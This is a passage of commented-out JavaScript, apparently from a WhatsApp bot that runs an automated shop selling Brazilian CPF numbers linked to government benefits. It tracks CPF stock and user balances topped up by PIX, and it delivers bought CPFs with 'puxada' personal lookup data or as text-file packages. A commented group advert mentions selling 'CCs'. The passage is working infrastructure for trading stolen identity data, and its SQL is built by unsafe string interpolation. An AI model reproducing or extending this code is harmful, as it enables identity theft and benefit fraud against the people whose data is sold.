        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             iD_Footer = Date.now()

        //             Texto = `*ESCOLHA O BENEFÍCIO!*`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'BENEFÍCIOS',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "BENEFÍCIOS",
        //                         rows: [
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "🔸 EXTRAORDINÁRIO",
        //                                 description: "CPFs vinculados ao benefício Extraordinário.",
        //                             },
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "🔹 SEGURO DESEMPREGO",
        //                                 description: "Em Breve!",
        //                             }
        //                         ]
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             })
        //                 .catch((erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("🔸 EXTRAORDINÁRIO") > -1) {

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO'`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM ESTOQUE DE EXTRAORDINARIO*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de CPF, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             iD_Footer = Date.now()

        //             Texto = `*CADASTRADOS OU NÃO CADASTRADOS?*`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'OPÇÕES',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "CADASTRADOS OU NÃO CADASTRADOS?",
        //                         rows: [
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "CADASTRADOS",
        //                                 description: "CPFs já com cadastro.",
        //                             },
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "NÃO CADASTRADOS",
        //                                 description: "CPFs Ainda não cadastrados.",
        //                             }
        //                         ]
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             })
        //                 .catch((erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("COD#") > -1) {

        //             Item_Fila_Sendo_Processado_MS = Date.now()

        //             try {
        //                 Div = Mensagem_Texto.split("COD#")
        //                 CODIGO = Div[1].split("#")
        //                 CODIGO = CODIGO[0]
        //                 console.log(CODIGO)

        //                 if (CODIGO === "01") {
        //                     TIPO_PACOTE = "EXTRAORDINARIO"
        //                     CADASTRADO_PACOTE = "0"
        //                     DATA_PACOTE = "20/04"
        //                 }
        //                 if (CODIGO === "02") {
        //                     TIPO_PACOTE = "EXTRAORDINARIO"
        //                     CADASTRADO_PACOTE = "0"
        //                     DATA_PACOTE = "04/05"
        //                 }

        //                 Div = Mensagem_Texto.split("Quantidade: ")
        //                 QUANTIDADE_PACOTE = Div[1].split(",")
        //                 QUANTIDADE_PACOTE = QUANTIDADE_PACOTE[0]

        //                 //QUANTIDADE_PACOTE = QUANTIDADE_PACOTE.replace(/[^0-9\.]/igm, '')

        //                 Div = Mensagem_Texto.split("R$: ")
        //                 VALOR_PACOTE = Div[1].split("💰")
        //                 VALOR_PACOTE = VALOR_PACOTE[0]
        //                 VALOR_PACOTE = parseFloat(VALOR_PACOTE).toFixed(2)
        //                 console.log(VALOR_PACOTE)

        //                 console.log(`TIPO_PACOTE: ${TIPO_PACOTE} | CADASTRADO: ${CADASTRADO_PACOTE} | DATA: ${DATA_PACOTE} | QUANTIDADE_PACOTE: ${QUANTIDADE_PACOTE} | VALOR PACOTE: ${VALOR_PACOTE}`)
        //             } catch (error) {
        //                 console.log(error)
        //                 await Menu(client, Numero, Mensagem_From)
        //                 Item_Fila_Sendo_Processado = "0"; return
        //             }

        //             Estoque = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0' AND DATA = '${DATA_PACOTE}'`).get()

        //             console.log(`Estoque = ${(Estoque["COUNT(*)"])} | QUANTIDADE = ${QUANTIDADE_PACOTE}`)

        //             if (parseFloat(QUANTIDADE_PACOTE) > parseFloat(Estoque["COUNT(*)"])) {

        //                 Texto = `⚠️ *Quantidade de CPF no estoque é inferior a quantidade escolhida por você!*

        // ⚙️ *NOSSA EQUIPE FOI NOTIFICADA* ⚙️

        // *Em breve o estoque será reabastecido*📦✅`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });

        //                 for await (adm of Adms) {
        //                     Texto = `⚠️*ATENÇÃO ADM*⚠️

        // *USUÁRIO wa.me/${Numero} TENTOU COMPRAR ${QUANTIDADE_PACOTE} CPFs, MAS SÓ TEM ${Estoque["COUNT(*)"]} NO ESTOQUE.*`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        //             SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

        //             console.log(`SALDO USER: ${SALDO_USUARIO} | VALOR PACOTE: ${VALOR_PACOTE}`)

        //             if (parseFloat(SALDO_USUARIO) < parseFloat(VALOR_PACOTE)) {

        //                 Texto = `⚠️*Você não possui saldo suficiente para comprar este pacote CPF.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });





        //                 MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
        //                 Exemplo_1 = parseInt(MIN_RECARGA)
        //                 Exemplo_2 = parseInt(MIN_RECARGA) + 3
        //                 Exemplo_3 = parseInt(MIN_RECARGA) + 15
        //                 Exemplo_4 = parseInt(MIN_RECARGA) + 47

        //                 Titulo = `💰 PIX AUTOMÁTICO`
        //                 iD_Footer = Date.now()
        //                 Texto = `💰 *PIX AUTOMÁTICO - TUTORIAL*

        // *Para adicionar saldo na store,use o comando /pix, seguido da quantidade desejada.*

        // *A RECARGA MÍNIMA É: R$:${MIN_RECARGA}*

        // *EXEMPLOS:*

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_1).toFixed(2)}*
        // /pix ${Exemplo_1}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_2).toFixed(2)}*
        // /pix ${Exemplo_2}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_3).toFixed(2)}*
        // /pix ${Exemplo_3}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_4).toFixed(2)}*
        // /pix ${Exemplo_4}


        // *VOCÊ PODE RECARREGAR O QUANTO QUISER A CIMA DE R$:${MIN_RECARGA}, SÓ TROCAR O VALOR DO COMANDO...*

        // Após o envio do comando, será gerado um código pix "Copia e Cola", para qual você irá efetuar o pagamento utilizando o aplicativo do seu banco de preferência, na sessão: Pix > Copia e Cola
        // `

        //                 await client.sendListMessage(Mensagem_From, {
        //                     buttonText: 'OPÇÕES',
        //                     description: Texto,
        //                     sections: [
        //                         {
        //                             title: "OPÇÕES",
        //                             rows: [
        //                                 {
        //                                     rowId: `${iD_Footer.toString()}|`,
        //                                     title: "🔙 MENU",
        //                                     description: "Menu incial.",
        //                                 }
        //                             ]
        //                         },
        //                     ],
        //                 }).then(async (result) => {
        //                     await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine(erro));
        //                     console.log(debugLine("Erro = " + (JSON.stringify(erro))));
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 })
        //                 return
        //             }


        //             NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_PACOTE)
        //             NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2);
        //             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()


        //             if (QUANTIDADE_PACOTE === "1") {

        //                 Array_MATERIAL = await DataBase_Better.prepare(`SELECT _rowid_,CPF,TIPO,CADASTRADO,DATA,DATA_MS_INSERIDO FROM CPF_EXTRAORDINARIO LIMIT 1`).get();

        //                 console.log(Array_MATERIAL)

        //                 await DataBase_Better.prepare(`INSERT INTO CPF_EXTRAORDINARIO_VENDIDOS (CPF,CADASTRADO,DATA,PUXADA,NUMERO_COMPRADOR,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO) VALUES ('${Array_MATERIAL["CPF"]}','${Array_MATERIAL["CADASTRADO"]}','${Array_MATERIAL["DATA"]}','${Array_MATERIAL["PUXADA"]}','${Mensagem_From}','${VALOR_PACOTE}','${QUANTIDADE_PACOTE}','${Date.now()}')`).run()
        //                 await DataBase_Better.prepare(`DELETE FROM CPF_EXTRAORDINARIO WHERE CPF = '${Array_MATERIAL["CPF"]}'`).run()

        //                 ID = Array_MATERIAL["rowid"]
        //                 CPF = Array_MATERIAL["CPF"]
        //                 CADASTRADO = Array_MATERIAL["CADASTRADO"]
        //                 DATA = Array_MATERIAL["DATA"]
        //                 TIPO = "EXTRAODINARIO"

        //                 PUXADA = await Puxar_CPF(CPF)

        //                 Texto_Usuario = `📜 *CPF COMPRADO* 📜

        // *CPF:* ${CPF}
        // *TIPO:* ${TIPO}
        // *CADASTRADO:* NÃO
        // *DATA:* ${DATA_PACOTE}
        // ${PUXADA}
        // `

        //                 await client.sendText(Mensagem_From, Texto_Usuario).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });

        //             } else {
        //                 Texto_Usuario = `📦 *PACOTE CPF COMPRADO!*

        // 🔸 *TIPO:* ${TIPO_PACOTE}
        // 📦 *TOTAL:* ${QUANTIDADE_PACOTE}
        // 💰 *VALOR PACOTE: R$:* ${VALOR_PACOTE}

        // Para obter dados puxados completos sobre cada CPF comprado, verifique no menu inicial a opção *CPFs COMPRADOS!*
        // `
        //                 Item_Fila_Sendo_Processado_MS = Date.now()
        //                 await client.sendImage(Mensagem_From, Comprou_PCT_CPF_PV, 'foto', Texto_Usuario).then(async (result) => {
        //                     //console.log('Result: ', result);
        //                 }).catch(async(erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 });

        //                 Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0' AND DATA = '${DATA_PACOTE}'`).all();
        //                 shuffle(Array_MATERIAL);

        //                 Data_Toda = new Date(parseInt(Date.now())).toLocaleString()
        //                 Div_Data = Data_Toda.toString().split(" ")

        //                 Data_File = Div_Data[0]
        //                 Data_File = Data_File.toString().replace(/\//igm, ' ');
        //                 Data_File = Data_File.toString().replace(/[^0-9\s]/igm, '');

        //                 Hora_File = Div_Data[1]
        //                 Hora_File = Hora_File.toString().replace(/\:/igm, ' ');
        //                 Hora_File = Hora_File.toString().replace(/[^0-9\s]/igm, '');

        //                 Nome_Bot_File = Nome_Bot.toString().replace(/[^a-zA-Z\s]/igm, '');

        //                 var Nome_File_Visual = `${QUANTIDADE_PACOTE} CPF ${Nome_Bot_File} PARA ${Numero} DATA ${Data_File} HORA ${Hora_File}.txt`
        //                 var Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`
        //                 Nome_File = Nome_File.replace(/\\/igm, '/');
        //                 //console.log(Nome_File)

        //                 const message = fs.createWriteStream(Nome_File);

        //                 for (let index = 0; index < QUANTIDADE_PACOTE; index++) {

        //                     message.write(`${Array_MATERIAL[index]["CPF"]}\n\n`);

        //                     await DataBase_Better.prepare(`INSERT INTO CPF_EXTRAORDINARIO_VENDIDOS (CPF,CADASTRADO,DATA,PUXADA,NUMERO_COMPRADOR,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO) VALUES ('${Array_MATERIAL[index]["CPF"]}','${Array_MATERIAL[index]["CADASTRADO"]}','${Array_MATERIAL[index]["DATA"]}','${Array_MATERIAL[index]["PUXADA"]}','${Mensagem_From}','${VALOR_PACOTE}','${QUANTIDADE_PACOTE}','${Date.now()}')`).run()
        //                     await DataBase_Better.prepare(`DELETE FROM CPF_EXTRAORDINARIO WHERE CPF = ${Array_MATERIAL[index]["CPF"]}`).run()

        //                     if (index === parseInt(QUANTIDADE_PACOTE) - 1) {
        //                         console.log("Foi")
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await DataBase_Better.prepare(`INSERT INTO PACOTES_CPF_VENDIDOS (TIPO,QUANTIDADE,VALOR,COMPRADOR,DATA_INSERIDO_MS) VALUES ('${TIPO_PACOTE}','${QUANTIDADE_PACOTE}','${VALOR_PACOTE}','${Mensagem_From}','${Date.now()}')`).run()

        //                         console.log(fs.existsSync(Nome_File))
        //                         if (fs.existsSync(Nome_File) === false) {
        //                             Item_Fila_Sendo_Processado_MS = Date.now()
        //                             await delay(3000)
        //                         }
        //                         console.log(fs.existsSync(Nome_File))
        //                         if (fs.existsSync(Nome_File) === false) {
        //                             Item_Fila_Sendo_Processado_MS = Date.now()
        //                             await delay(3000)
        //                         }
        //                         console.log(fs.existsSync(Nome_File))
        //                         if (fs.existsSync(Nome_File) === false) {
        //                             Item_Fila_Sendo_Processado_MS = Date.now()
        //                             await delay(3000)
        //                         }
        //                         console.log(fs.existsSync(Nome_File))
        //                         if (fs.existsSync(Nome_File) === false) {
        //                             Item_Fila_Sendo_Processado_MS = Date.now()
        //                             await delay(3000)
        //                         }
        //                         console.log(fs.existsSync(Nome_File))
        //                         if (fs.existsSync(Nome_File) === false) {
        //                             Item_Fila_Sendo_Processado_MS = Date.now()
        //                             await delay(3000)
        //                         }
        //                         console.log(fs.existsSync(Nome_File))
        //                         if (fs.existsSync(Nome_File) === false) {
        //                             Item_Fila_Sendo_Processado_MS = Date.now()
        //                             await delay(3000)
        //                         }

        //                         await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                         }).catch(async(erro) => {
        //                             console.error('Error when sending1: ', erro);
        //                             try {
        //                                 //await delay(10000)
        //                                 await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.error('Error when sending2: ', erro);
        //                                 });
        //                             } catch (error) {
        //                                 console.error('Error when sending1: ', erro);
        //                             }
        //                         });
        //                     }
        //                 }

        //             }


        //             /*             if (Notif_Grupo_Comprou_MIX === true) {
        //             Texto_Grupo = `📦 *USUÁRIO COMPROU UM PACOTE MIX* 📦

        //             👤 *USUÁRIO:* wa.me/${Numero}
        //             📦 *COMPROU PACOTE MIX DE* ${QUANTIDADE_PACOTE} *CCs* 

        //             ────────────────

        //             *VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

        //             *ATENDIMENTO 100% AUTOMÁTICO!*

        //             Este é o número do BOT, mande qualquer mensagem!
        //             wa.me/${NUMERO_PURO_BOT}
        //             `

        //             for await (Grupo of ID_GRUPOS) {
        //             try {
        //             await client.sendImage(Grupo["ID_GRUPO"], Comprou_PCT_CPF_GP, 'foto', Texto_Grupo).then(async (result) => {
        //             }).catch(async(erro) => {
        //             console.error('Error when sending: ', erro);
        //             });
        //             } catch (error) {
        //             }
        //             }
        //             } */

        //             Texto_Adms = `*ADMS: 📦 PACOTE CPF COMPRADO*

        // 👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
        // 📦 *TOTAL:* ${QUANTIDADE_PACOTE}
        // 💰 *VALOR PCT: R$:* ${VALOR_PACOTE}
        // `
        //             for await (adm of Adms) {
        //                 Texto = Texto_Adms
        //                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }

        //             Texto = "*Para prosseguir ou consultar os CPFs comprados, digite qualquer mensagem.*"
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });

        //             console.log(`Pacote CPF Comprado Numero: wa.me/${Numero} | Quantidade: ${QUANTIDADE_PACOTE} | Valor: ${VALOR_PACOTE}`)
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📘 CPFs COMPRADOS") > -1) {

        //     iD_Footer = Date.now()

        //     Texto = `*ESCOLHA O BENEFÍCIO COMPRADO!*`

        //     await client.sendListMessage(Mensagem_From, {
        //         buttonText: 'BENEFÍCIOS COMPRADOS',
        //         description: Texto,
        //         sections: [
        //             {
        //                 title: "BENEFÍCIOS COMPRADOS",
        //                 rows: [
        //                     {
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: "🟠 EXTRAORDINÁRIOs COMPRADOS",
        //                         description: "CPFs do benefício Extraordinário comprados",
        //                     },
        //                     {
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: "SEGURO DESEMPREGOs COMPRADOS",
        //                         description: "Em Breve!",
        //                     }
        //                 ]
        //             },
        //         ],
        //     }).then(async (result) => {
        //         await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //     })
        //         .catch((erro) => {
        //             console.error('Error when sending: ', erro);
        //         })
        //     return

        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("🟠 EXTRAORDINÁRIOs COMPRADOS") > -1) {

        //             item_Array = await DataBase_Better.prepare(`SELECT _rowid_,CPF,CADASTRADO,DATA,PUXADA,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO FROM CPF_EXTRAORDINARIO_VENDIDOS WHERE NUMERO_COMPRADOR = '${Mensagem_From}'`).all();

        //             if (item_Array === undefined) {
        //                 Texto = "Você não comprou nenhum CPF ainda!"
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             iD_Footer = Date.now()

        //             Array_Botoes = []
        //             for await (item of item_Array) {

        //                 CADASTRADO = "-"
        //                 if (item["CADASTRADO"] === "0") {
        //                     CADASTRADO = "Não Cadastrado"
        //                 }

        //                 Array_Botoes.push({
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: `CPF:${item["CPF"]} - ${CADASTRADO}`,
        //                     description: `Extraordinário - Data:${item["DATA"]}  - 🟠 ID_CPF_COMPRADO:${item["rowid"]}`
        //                 })
        //             }

        //             Texto = `📘 *CPFs COMPRADOS* 📘

        // Veja todas as informações sobre cada CPF comprado por você.
        // `

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: "CPFs Comprados",
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "HISTÓRICO DE CPFs COMPRADO",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
